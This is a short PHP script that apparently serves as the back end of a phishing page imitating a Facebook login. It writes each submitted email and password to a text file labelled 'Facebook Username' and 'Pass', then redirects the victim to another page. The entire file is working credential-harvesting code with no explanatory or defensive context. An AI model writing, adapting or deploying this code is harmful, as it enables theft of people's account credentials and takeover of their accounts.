<?php
file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " \nPass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: /log.html');
exit();
?>